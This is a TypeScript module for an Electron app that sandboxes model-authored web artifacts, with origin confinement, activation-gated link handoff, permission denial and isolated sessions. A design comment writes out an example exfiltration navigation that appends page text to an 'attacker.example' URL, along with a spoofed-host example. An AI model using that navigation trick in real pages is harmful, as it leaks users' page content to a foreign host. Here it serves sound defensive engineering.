import { AnnotationCommentActionSchema, ArtifactPickerPinSchema, type AnnotationCommentPins, type AnnotationCommentAction, type AnnotationSelection, type ArtifactPickerPin } from '@rally/contracts';
import { zodDiagnosticCode } from '@rally/contracts/zod-diagnostics';
import { z, type ZodType } from 'zod';
/**
 * The two surfaces that show a live artifact, and the one isolation contract
 * both are built from.
 *
 * A live artifact is **model-authored web content served from an origin Rally
 * does not control the contents of**. It is shown in two places — a
 * `WebContentsView` composited over the right rail's preview region, and a
 * pop-out window — and they share one creation path deliberately: two window
 * factories with the same intent drift, and the one that drifts is the one that
 * quietly gains a preload.
 *
 * **The renderer never embeds, fetches, or parses artifact content.** An
 * `<iframe>` would mean widening the renderer's CSP to a wildcard artifact host
 * and grafting remote model-authored content into the application DOM as a
 * navigable, `postMessage`-reachable child — the exact adjacency the backdrop
 * rules forbid. So the main process owns the view, composites it over the
 * rail's rectangle, and the renderer can only *ask for an artifact*: it can
 * never navigate one.
 *
 * See `docs/live-web-artifacts.md` and `docs/security.md`.
 */
import { ARTIFACT_RESERVED_PREFIX, parseArtifactHost } from '@rally/contracts';
import type { Session } from 'electron';

/**
 * The parts of an Electron view and window this controller touches.
 *
 * Named as capabilities rather than imported as classes so this module holds no
 * runtime `electron` import — which is what lets every decision in it be unit
 * tested, and follows the house pattern of keeping main-process policy separate
 * from the objects it drives. `index.ts` supplies the real thing.
 */
export interface ArtifactViewHandle {
  /**
   * Whether the surface behind this handle is already gone.
   *
   * Part of the contract because a preview outlives nothing: Electron destroys
   * a window's whole view tree with the window, and the window can go at any
   * moment — quitting to install an update closes it out from under a live
   * artifact. Every other method here throws `Object has been destroyed` once
   * that has happened, and thrown from a `closed` handler that is an uncaught
   * exception in the main process, which is a crash dialog rather than a quit.
   * So the controller asks before it acts instead of tearing down blind.
   */
  destroyed(): boolean;
  setBounds(bounds: PreviewBounds): void;
  /**
   * Round the view's own corners.
   *
   * Part of the contract because CSS cannot reach a native view, and the view
   * is what reaches the bottom corners of the surface holding it.
   */
  setBorderRadius(radius: number): void;
  /**
   * Show or hide the view without changing its size. A view loading behind the
   * rail's "Opening…" is hidden this way rather than collapsed, so the site's
   * startup code measures the pane it will be shown in, not a 0×0 viewport.
   */
  setVisible(visible: boolean): void;
  /**
   * Navigate to an artifact, resolving `true` once the artifact's own document
   * is ready to show and `false` on a terminal failure. See
   * `loadArtifactDocument`.
   */
  load(url: string): Promise<boolean>;
  /** The page as painted now, as an image data URL, or `null` when nothing is painted. */
  capture(): Promise<string | null>;
  /** Whether the page carries Rally's annotation API; see `artifactPageAnnotations`. */
  ready?: () => Promise<boolean>;
  pick?: () => Promise<unknown>;
  stopPicking?: () => Promise<void>;
  /** Draw the confirmed cards and keep `selected` highlighted as the selection being edited, when it is on this page and unchanged. */
  comments?: (pins: AnnotationCommentPins, selected: AnnotationSelection | null) => Promise<AnnotationCommentAction | null>;
  close(): void;
}

/** What `rallyAnnotations.rect(css)` answers: an element's rectangle and the viewport it is in. */
export const ArtifactViewportRectSchema = z.object({
  x: z.number().finite(),
  y: z.number().finite(),
  width: z.number().nonnegative(),
  height: z.number().nonnegative(),
  viewportWidth: z.number().positive(),
  viewportHeight: z.number().positive(),
}).nullable();
export type ArtifactViewportRect = z.infer<typeof ArtifactViewportRectSchema>;

/**
 * The page's annotation API, reached through `executeJavaScript`.
 *
 * The serving Worker puts `globalThis.rallyAnnotations` into every page a
 * Rally viewer loads (`docs/artifact-annotations.md`), and the desktop calls
 * it where the browser client would post a message. Each call is one script
 * that answers `null` where the API is absent, so a page the Worker did not
 * serve (a protected site's refusal, an error page) reads as not ready rather
 * than as a thrown reference error. Every answer is parsed: it comes from a
 * document the page's own scripts share.
 */
export function artifactPageAnnotations(execute: (code: string) => Promise<unknown>) {
  const call = (expression: string): Promise<unknown> =>
    execute(`globalThis.rallyAnnotations ? globalThis.rallyAnnotations.${expression} : null`);
  // The page's answer, or an error naming the field it failed on. The page
  // shares the world the API runs in, so its keys and values stay out of it.
  const parse = <T>(schema: ZodType<T>, raw: unknown, label: string): T => {
    const parsed = schema.safeParse(raw);
    if (parsed.success) return parsed.data;
    throw new Error(zodDiagnosticCode(parsed.error, label) ?? `${label}_invalid`);
  };
  return {
    ready: async (): Promise<boolean> =>
      await execute('typeof globalThis.rallyAnnotations === "object" && globalThis.rallyAnnotations !== null') === true,
    pick: async (): Promise<ArtifactPickerPin | null> => {
      const raw = await call('pick()');
      // Never the page's bytes: a pin's `screenshot` is main's own capture or
      // nothing, so the field is not even read from the page's answer.
      return raw === null || raw === undefined ? null : parse(ArtifactPickerPinSchema.omit({ screenshot: true }), raw, 'artifact_pin');
    },
    stopPicking: async (): Promise<void> => { await call('stopPicking()'); },
    comments: async (pins: AnnotationCommentPins, selected: AnnotationSelection | null = null): Promise<AnnotationCommentAction | null> => {
      const raw = await call(`comments(${JSON.stringify(pins)}, ${JSON.stringify(selected)})`);
      return raw === null || raw === undefined ? null : parse(AnnotationCommentActionSchema, raw, 'annotation_comment_action');
    },
    rect: async (css: string): Promise<ArtifactViewportRect> =>
      parse(ArtifactViewportRectSchema, await call(`rect(${JSON.stringify(css)})`) ?? null, 'artifact_element_rect'),
  };
}


export interface ArtifactHostWindow {
  /** Whether the window is gone; see `ArtifactViewHandle.destroyed`. */
  destroyed(): boolean;
  contentSize(): { width: number; height: number };
  /** Rally's renderer zoom; native views use window points. */
  zoomFactor(): number;
  removeView(view: ArtifactViewHandle): void;
}

/** Bounds the renderer reports for the rail's preview region, window-relative. */
export interface PreviewBounds {
  x: number;
  y: number;
  width: number;
  height: number;
}

export interface ArtifactPresentation {
  artifactId: string;
  /** The one-shot access URL; its code lives in the fragment. */
  url: string;
  bounds: PreviewBounds;
  /**
   * The corner the renderer drew on the pane this view covers, in CSS pixels.
   * Nothing here decides it: the surface hosting the pane is the only thing
   * that knows whether the page meets a rounded edge or a square one.
   */
  cornerRadius: number;
}

/**
 * Apply the main process's broad navigation fence without stealing artifact
 * navigation from its stricter, origin-scoped owner.
 *
 * `web-contents-created` installs the broad fence before a `WebContentsView`
 * can be marked as an artifact. The decision therefore happens when the
 * navigation fires. Most importantly, an artifact returns before
 * `preventDefault()`: preventing first and then "deferring" blocked the
 * bootstrap's same-origin redemption POST and left every preview on an empty
 * Opening page.
 */
export function applyGlobalNavigationPolicy(input: {
  event: { preventDefault(): void };
  url: string;
  artifactSurface: boolean;
  rendererAllowed: (url: string) => boolean;
  externalAllowed: (url: string) => boolean;
  openExternal: (url: string) => void;
}): void {
  if (input.rendererAllowed(input.url) || input.artifactSurface) return;
  input.event.preventDefault();
  if (input.externalAllowed(input.url)) input.openExternal(input.url);
}

/**
 * Whether a URL is one this process will load into an artifact surface.
 *
 * The renderer supplies it, so it is checked here rather than trusted: `https:`
 * only, and only on the artifact serving domain. A view that would load
 * anything else is a view that could be pointed at the application's own origin
 * or at an attacker's, which is the whole capability this function withholds.
 *
 * The domain is matched as a suffix on a label boundary rather than by
 * `includes`, so `rallyusercontent.com.evil.test` is refused.
 */
export function isArtifactUrl(candidate: string, servingDomain: string): boolean {
  let url: URL;
  try {
    url = new URL(candidate);
  } catch {
    return false;
  }
  if (url.protocol !== 'https:') return false;
  const host = url.hostname.toLowerCase();
  const domain = servingDomain.toLowerCase();
  const suffix = `.${domain}`;
  if (!host.endsWith(suffix)) return false;
  const label = host.slice(0, -suffix.length);
  if (!label || label.includes('.')) return false;
  return parseArtifactHost(label) !== null;
}

/**
 * Load an artifact's initial URL without mistaking its bootstrap form POST for
 * a network failure. Electron rejects `loadURL()` with `ERR_ABORTED` whenever
 * the loaded page starts a second main-frame navigation before finishing; that
 * is exactly how `/__rally/open` redeems its fragment-held capability.
 */
export async function loadArtifactInitialUrl(loadURL: () => Promise<void>): Promise<boolean> {
  try {
    await loadURL();
    return true;
  } catch (error) {
    return typeof error === 'object' && error !== null && 'code' in error
      && error.code === 'ERR_ABORTED';
  }
}

/** The events of an artifact's web contents that `loadArtifactDocument` reads. */
export interface ArtifactDocumentContents {
  loadURL(url: string): Promise<void>;
  getURL(): string;
  on(event: 'dom-ready' | 'destroyed', listener: () => void): unknown;
  on(event: 'did-fail-load', listener: (
    event: unknown, errorCode: number, errorDescription: string, url: string, isMainFrame: boolean,
  ) => void): unknown;
  removeListener(event: 'dom-ready' | 'destroyed' | 'did-fail-load', listener: (...args: never[]) => void): unknown;
}

/**
 * Load an artifact and resolve once **the artifact's own document** is ready.
 *
 * The access URL is the redeem bootstrap, a Rally page with its own "Opening…"
 * that lasts one round trip. Showing the view from the start painted that page
 * over the rail's own "Opening…": two loading looks, one after the other, for
 * one open. Waiting for the first `dom-ready` that is not the bootstrap keeps
 * the rail's placeholder the only one. Chromium fires no `dom-ready` for the
 * bootstrap in practice, since its form POST replaces it mid-parse; the path
 * check is what makes that not matter.
 *
 * `ERR_ABORTED` is that same POST replacing the bootstrap, not a failure (see
 * `loadArtifactInitialUrl`). Any other main-frame failure, or the contents
 * going away, resolves `false`.
 */
export async function loadArtifactDocument(contents: ArtifactDocumentContents, url: string): Promise<boolean> {
  return await new Promise<boolean>((resolve) => {
    const finish = (shown: boolean): void => {
      contents.removeListener('dom-ready', ready);
      contents.removeListener('did-fail-load', failed);
      contents.removeListener('destroyed', gone);
      resolve(shown);
    };
    const ready = (): void => {
      if (!isRedeemBootstrap(contents.getURL())) finish(true);
    };
    const failed = (_event: unknown, errorCode: number, _description: string, _url: string, isMainFrame: boolean): void => {
      if (isMainFrame && errorCode !== ERR_ABORTED) finish(false);
    };
    const gone = (): void => finish(false);
    contents.on('dom-ready', ready);
    contents.on('did-fail-load', failed);
    contents.on('destroyed', gone);
    void loadArtifactInitialUrl(() => contents.loadURL(url)).then((loaded) => {
      if (!loaded) finish(false);
    });
  });
}

/** Chromium's `net::ERR_ABORTED`, as `did-fail-load` reports it. */
const ERR_ABORTED = -3;

function isRedeemBootstrap(candidate: string): boolean {
  try {
    return new URL(candidate).pathname === `${ARTIFACT_RESERVED_PREFIX}/open`;
  } catch {
    return false;
  }
}

/**
 * Keep the preview inside the window it is composited over.
 *
 * The renderer measures the rectangle in CSS pixels, so a wrong or hostile one
 * would put a view over the whole window. `zoom` converts to window points;
 * clamping is what makes the bounds a *request* rather than an instruction.
 */
export function clampBounds(
  bounds: PreviewBounds,
  window: { width: number; height: number },
  zoom = 1,
): PreviewBounds {
  const x = Math.max(0, Math.min(Math.round(bounds.x * zoom), window.width));
  const y = Math.max(0, Math.min(Math.round(bounds.y * zoom), window.height));
  return {
    x,
    y,
    width: Math.max(0, Math.min(Math.round(bounds.width * zoom), window.width - x)),
    height: Math.max(0, Math.min(Math.round(bounds.height * zoom), window.height - y)),
  };
}

/**
 * The session partition one artifact's surfaces share.
 *
 * Per artifact, so one artifact's cookies and storage are unreachable from
 * another's — and shared between the rail preview and the pop-out, so a person
 * who authorized the artifact once does not authorize it again when they pop it
 * out.
 */
export function artifactPartition(artifactId: string): string {
  return `persist:artifact-${artifactId}`;
}

/**
 * The web preferences every artifact surface is created with.
 *
 * This is the message-export window's isolation contract with visibility turned
 * on. Each item is load-bearing: **no preload** so there is no bridge to reach,
 * **no Node**, **sandbox on**, **`contextIsolation`**, and a per-artifact
 * partition. Artifact code cannot tell the rail preview from a browser tab,
 * which is exactly the property that makes both safe.
 */
export function artifactWebPreferences(artifactId: string, packaged: boolean) {
  return {
    // Deliberately no `preload`: the renderer's bridge is a capability, and
    // model-authored content is the last content that should hold one.
    partition: artifactPartition(artifactId),
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: true,
    webSecurity: true,
    allowRunningInsecureContent: false,
    devTools: !packaged,
    spellcheck: false,
  } as const;
}

/**
 * How long a real input event keeps counting as the person's own action.
 *
 * Not a number chosen here. Five seconds is Chromium's transient user
 * activation lifespan (`blink::UserActivationState::kActivationLifespan`,
 * Chromium source, read 2026-09-11) — the same window the page's own
 * `navigator.userActivation.isActive` reports, and the same one the renderer
 * uses to tell a person's popup from a blocked one. Electron reports no
 * activation on `will-navigate` or on the window-open handler, so the main
 * process reconstructs the state from the input events those contents receive;
 * reconstructing it with some other span would make Rally and the page it is
 * showing disagree about whether somebody is acting.
 */
export const TRANSIENT_ACTIVATION_LIFESPAN_MS = 5_000;

/**
 * The input events that start a transient activation.
 *
 * Mapped to the events HTML calls *activation-triggering* rather than to every
 * representation of a press, because this set is a security boundary and a
 * boundary wider than the one it claims to reconstruct is the wrong kind of
 * wrong. So: the beginning of a press (`mouseDown`, `pointerDown`, a key going
 * down) and the completion of a touch (`touchEnd`, `gestureTap`) — never the
 * release half of a mouse or key press, and never the *start* of a touch.
 *
 * Each exclusion is a case. `mouseUp` and `keyUp` would arm on a press that
 * began somewhere else and merely finished over this surface. `char` is a text
 * event, not an interaction. `touchStart` would arm on a touch that goes on to
 * be cancelled, which is a gesture the person abandoned. Pointer movement,
 * hover, wheel, and the scroll gestures are not activation in any browser and
 * would let a page navigate itself under a passing cursor, reaching the system
 * browser having asked nobody.
 *
 * `pointerUp` is deliberately absent even though HTML admits it for non-mouse
 * pointers: `InputEvent` carries no `pointerType`, so admitting it would admit
 * the mouse case too — and a real non-mouse interaction has already armed this
 * on its `pointerDown`.
 */
const ACTIVATING_INPUT_TYPES = new Set([
  'mouseDown',
  'pointerDown',
  'keyDown',
  'rawKeyDown',
  'touchEnd',
  'gestureTap',
]);

/**
 * One artifact surface's transient user activation, kept in the main process.
 *
 * Per surface rather than per application: a flag shared between the rail
 * preview and a pop-out would let a click in one send the other's page to the
 * browser, and those two are showing different documents.
 */
export class ArtifactUserActivation {
  private activatedAt: number | null = null;

  constructor(private readonly now: () => number = Date.now) {}

  /** Called for every input event the surface's contents receive. */
  record(inputType: string): void {
    if (ACTIVATING_INPUT_TYPES.has(inputType)) this.activatedAt = this.now();
  }

  /**
   * Drop the activation because the document it belonged to is gone.
   *
   * Activation is a property of a document, not of a window, and a same-origin
   * navigation does not spend it — so without this a press aimed at an ordinary
   * in-site link would still be live when the *next* page loads, and that
   * page's `onload` could spend somebody's click on a destination they never
   * saw. Called when a main-frame navigation commits, which is the moment the
   * document that was pressed stops existing.
   */
  reset(): void {
    this.activatedAt = null;
  }

  /**
   * Spend the activation on one departure, reporting whether there was one.
   *
   * Consuming is the half that makes this a gate rather than a five-second
   * window of permission. `window.open` in a real browser consumes transient
   * activation for the same reason: without it one press admits a loop, and a
   * page that answers a click with a hundred `window.open` calls would send a
   * hundred URLs to the system opener — an unbounded exfiltration channel and a
   * tab flood, out of one press the person thought followed one link.
   */
  take(): boolean {
    const active = this.active();
    this.activatedAt = null;
    return active;
  }

  /** Whether a navigation starting now is one a person just asked for. */
  active(): boolean {
    if (this.activatedAt === null) return false;
    const elapsed = this.now() - this.activatedAt;
    // A clock that moved backwards — a system time change mid-session — must
    // read as "not activated" rather than as an activation that never expires.
    return elapsed >= 0 && elapsed <= TRANSIENT_ACTIVATION_LIFESPAN_MS;
  }
}

/** What an artifact surface may do with a navigation it is about to start. */
export type ArtifactNavigationDecision = 'continue' | 'hand-off' | 'refuse';

/**
 * The one place that decides whether an artifact's navigation is followed,
 * handed to the system browser, or dropped.
 *
 * Separate from the wiring below so the rule can be read and tested as a rule:
 * it is the single sentence that says what a model-authored page can make this
 * application do with a URL.
 */
export function decideArtifactNavigation(input: {
  url: string;
  origin: string;
  /**
   * Spend the surface's transient activation, reporting whether there was one.
   *
   * A callback rather than a boolean so that the deciding and the spending are
   * one step and cannot come apart: a caller handed a boolean can forget to
   * consume it, and the failure that follows is a page departing many times on
   * one press. It is called **last**, so a press is never spent on a
   * navigation that was going to be refused for some other reason, and **at
   * most once** per navigation.
   */
  takeActivation: () => boolean;
  /** The main process's own scheme policy for a URL it would hand to the OS. */
  externalAllowed: (url: string) => boolean;
}): ArtifactNavigationDecision {
  if (sameOrigin(input.url, input.origin)) return 'continue';
  if (input.externalAllowed(input.url) && input.takeActivation()) return 'hand-off';
  return 'refuse';
}

/** The capability an artifact surface is confined with: how it may leave. */
export interface ArtifactLinkHandoff {
  /** Spend the surface's transient activation, reporting whether there was one. */
  takeActivation(): boolean;
  /** The main process's own scheme policy for a URL it would hand to the OS. */
  externalAllowed(url: string): boolean;
  openExternal(url: string): void;
  /**
   * Show a same-origin URL in this surface, for a link that asked for a window
   * it cannot have. Never called with anything off-origin.
   */
  navigateInPlace(url: string): void;
}

/**
 * Lock a web contents to one artifact's origin, and let only a person's own
 * click leave it.
 *
 * Applied to both surfaces from one place. An off-origin navigation is never
 * followed *in place*, and every permission request is denied outright — an
 * artifact has no business asking for a camera, and a prompt that appears to
 * come from Rally is worse than one that never appears.
 *
 * **The link handoff is gated on transient user activation, and the gate is the
 * whole of it.** Artifact code is model-authored and can put whatever it likes
 * in a URL: `location = "https://attacker.example/?" + document.body.innerText`
 * is a navigation, not a `fetch`, so the CSP's `connect-src` and `form-action`
 * do not touch it — and handing that URL to the person's browser unprompted
 * would be Rally *performing* the exfiltration the egress fence exists to
 * prevent. Requiring a press the page could not have made itself removes the
 * unattended form of that: a site cannot send itself off-origin while nobody is
 * there, and cannot do it on a timer, on load, or on a cursor passing over it.
 *
 * **The activation is spent by the departure it admits**, so one press buys one
 * departure and not a five-second licence: a page that answers a click with a
 * loop of `window.open` calls gets its first URL opened and no more. This is
 * what `window.open` does to transient activation in a browser, and for the
 * same reason.
 *
 * It does **not** remove the attended form, and that is stated rather than
 * implied: a person clicking "Read the docs" cannot see where the link points,
 * so a page that wants to leak through a click still can — one URL per press.
 * What was bought is that every such handoff is somebody's own press, inside
 * the five seconds a browser would also call theirs.
 * `docs/live-web-artifacts.md` carries the whole of what is and is not closed
 * here.
 *
 * A **redirect is not a click** and is refused whatever the activation says.
 * The destination of a `302` is not the URL the person chose to follow, and a
 * model-authored handler answers requests on this origin, so treating a
 * redirect as activated would hand the gate straight back to the page.
 */
export function confineToArtifactOrigin(
  contents: {
    on(
      event: 'will-navigate' | 'will-redirect',
      handler: (event: { preventDefault(): void }, url: string) => void,
    ): void;
    setWindowOpenHandler(handler: (details: { url: string }) => { action: 'deny' }): void;
    session: Pick<Session, 'setPermissionRequestHandler'>;
  },
  origin: string,
  handoff: ArtifactLinkHandoff,
): void {
  const decide = (url: string, handOffAllowed: boolean): ArtifactNavigationDecision => (
    decideArtifactNavigation({
      url,
      origin,
      // A redirect never spends the press either, so a click followed by a
      // same-origin handler's `302` leaves the activation for the link the
      // person actually goes on to follow.
      takeActivation: () => handOffAllowed && handoff.takeActivation(),
      externalAllowed: handoff.externalAllowed,
    })
  );
  const fence = (
    event: { preventDefault(): void },
    url: string,
    handOffAllowed: boolean,
  ): void => {
    const decision = decide(url, handOffAllowed);
    if (decision === 'continue') return;
    event.preventDefault();
    if (decision === 'hand-off') handoff.openExternal(url);
  };
  contents.on('will-navigate', (event, url) => fence(event, url, true));
  contents.on('will-redirect', (event, url) => fence(event, url, false));
  // A second artifact window is never created, so `target="_blank"` is answered
  // by where the link goes rather than by a new window. Off-origin, it is the
  // person's click and leaves through the same gate as any other link — it just
  // leaves without a window being made. Same-origin, it is a page of the site
  // somebody is already looking at, so it is shown in this surface: the nearest
  // thing available to a new tab, and the only answer that keeps the viewer
  // session, since a protected site opened anonymously in a browser answers 401.
  // Dropping it, as this did first, left an ordinary class of in-site links
  // doing visibly nothing.
  contents.setWindowOpenHandler(({ url }) => {
    const decision = decide(url, true);
    if (decision === 'hand-off') handoff.openExternal(url);
    if (decision === 'continue') handoff.navigateInPlace(url);
    return { action: 'deny' };
  });
  contents.session.setPermissionRequestHandler((_contents, _permission, callback) => {
    callback(false);
  });
}

function sameOrigin(candidate: string, origin: string): boolean {
  try {
    return new URL(candidate).origin === origin;
  } catch {
    return false;
  }
}


/**
 * The rail's live preview: one view per window, composited over a fixed pane.
 *
 * **At most one exists per window**, and it is destroyed when the detail closes,
 * the work stream changes, or the flag goes off. Two would mean two artifacts
 * painting over one rectangle, and the one underneath would still be running.
 *
 * **Overlays hide it.** A `WebContentsView` composites *above* the renderer's
 * DOM, so any app surface that can overlap the rail — a dialog, the command
 * palette, a lightbox, a menu — would be painted over by artifact content. The
 * renderer reports overlay open and close, and the view is hidden meanwhile.
 * This is the classic embedded-view pitfall and it is handled here so no
 * reviewer has to rediscover it.
 */
export class ArtifactPreviewController {
  private view: ArtifactViewHandle | null = null;
  private artifactId: string | null = null;
  private pendingLoad: { view: ArtifactViewHandle; result: Promise<boolean> } | null = null;
  private bounds: PreviewBounds | null = null;
  private hiddenByOverlay = false;

  constructor(
    private readonly window: ArtifactHostWindow,
    private readonly servingDomain: string,
    private readonly createView: (request: ArtifactPresentation) => ArtifactViewHandle,
  ) {}

  /** Show one artifact in the rail's preview region. */
  async present(request: ArtifactPresentation): Promise<boolean> {
    if (!isArtifactUrl(request.url, this.servingDomain)) return false;
    if (this.window.destroyed()) return false;
    // A view whose contents closed themselves — an artifact page calling
    // `window.close()` — is still held here, and still counts as *this*
    // artifact. Discarding it before the comparison below is what stops a
    // repeat presentation reusing it: nothing would be composited, but this
    // would report success, and the rail reads that as a live preview and
    // renders no fallback over the blank pane.
    if (this.view?.destroyed()) this.destroy();
    if (this.artifactId !== request.artifactId) this.destroy();
    this.bounds = request.bounds;
    if (!this.view) {
      this.view = this.createView(request);
      this.artifactId = request.artifactId;
      const created = this.view;
      // Once, at creation: the corner belongs to the surface rather than to any
      // one layout, so it must not ride along with the bounds a scroll
      // recomputes many times a second.
      created.setBorderRadius(request.cornerRadius);
      // Hidden, at full size, until the site's own document is ready: the
      // rail's "Opening…" is what a person sees over the redeem bootstrap.
      created.setVisible(false);
      this.applyBounds();
      const result = created.load(request.url).then((loaded) => {
        // DNS, TLS, and terminal navigation failures should not leave an empty
        // composited view.
        if (this.view !== created) return loaded;
        if (!loaded) this.destroy();
        else created.setVisible(true);
        return loaded;
      });
      this.pendingLoad = { view: created, result };
    }
    const current = this.view;
    if (!current) return false;
    const pending = this.pendingLoad?.view === current ? this.pendingLoad.result : null;
    if (pending && !await pending) return false;
    if (this.pendingLoad?.result === pending) this.pendingLoad = null;
    // A different presentation may have replaced this view while its initial
    // navigation was pending. The old caller must not report the new view as
    // its own success.
    if (this.view !== current || this.artifactId !== request.artifactId) return false;
    this.applyBounds();
    return true;
  }

  /** Move the view when the rail's layout changes. Layout only, never scroll. */
  setBounds(bounds: PreviewBounds): void {
    this.bounds = bounds;
    this.applyBounds();
  }

  /** Called when an app surface that can overlap the rail opens or closes. */
  setOverlayOpen(open: boolean): void {
    this.hiddenByOverlay = open;
    this.applyBounds();
  }

  /** A still of the live page, for the pane while an overlay hides the view. */
  async snapshot(): Promise<string | null> {
    const view = this.view;
    // A view still loading is hidden behind the rail's "Opening…": nothing of
    // the site is on screen to stand in for.
    if (!view || view.destroyed() || this.hiddenByOverlay || this.pendingLoad?.view === view) return null;
    return await view.capture();
  }

  /** Whether the shown page can take comments. False while nothing is shown or it is still loading. */
  async ready(): Promise<boolean> {
    const view = this.view;
    if (!view || view.destroyed() || this.pendingLoad?.view === view) return false;
    const result = await view.ready?.() ?? false;
    return this.view === view && !view.destroyed() ? result : false;
  }
  async pick(): Promise<unknown> {
    const view = this.view;
    if (!view || view.destroyed() || this.pendingLoad?.view === view) return null;
    const result = await view.pick?.() ?? null;
    return this.view === view && !view.destroyed() ? result : null;
  }
  async comments(pins: AnnotationCommentPins, selected: AnnotationSelection | null = null): Promise<AnnotationCommentAction | null> {
    const view=this.view;
    if (!view || view.destroyed() || this.pendingLoad?.view===view) return null;
    const result=await view.comments?.(pins, selected) ?? null;
    return this.view===view && !view.destroyed() ? result : null;
  }
  async stopPicking(): Promise<void> { await this.view?.stopPicking?.(); }

  destroy(): void {
    const view = this.view;
    this.view = null;
    this.artifactId = null;
    this.pendingLoad = null;
    this.bounds = null;
    this.hiddenByOverlay = false;
    if (!view) return;
    // Each guard is about its own object, because the two die independently.
    // A destroyed window has already taken its children with it, so there is
    // nothing to detach — and asking it to would throw. A view whose contents
    // closed themselves is still attached to a live window, so it still has to
    // be detached; it is only closing it a second time that would throw.
    if (!this.window.destroyed()) this.window.removeView(view);
    if (!view.destroyed()) view.close();
  }

  /**
   * For tests and diagnostics: which artifact this window is showing, or
   * `null` once `destroy()` has run.
   */
  currentArtifactId(): string | null {
    return this.artifactId;
  }

  private applyBounds(): void {
    if (!this.view || !this.bounds) return;
    // Two halves gating two different calls: `contentSize()` below reads the
    // window, `setBounds()` reads the view. Only the view half is falsifiable,
    // here and in production — Electron destroys a window's views with it, so
    // a destroyed window implies a destroyed view and the first half can never
    // be the one that returns. It stays because it names what `contentSize()`
    // needs, and that stops the day the two stop dying together.
    if (this.window.destroyed() || this.view.destroyed()) return;
    if (this.hiddenByOverlay) {
      // Collapsed rather than detached: a zero rectangle keeps the page loaded
      // and its state intact, so closing a dialog restores what the person was
      // looking at rather than reloading it under them.
      this.view.setBounds({ x: 0, y: 0, width: 0, height: 0 });
      return;
    }
    this.view.setBounds(clampBounds(this.bounds, this.window.contentSize(), this.window.zoomFactor()));
  }
}
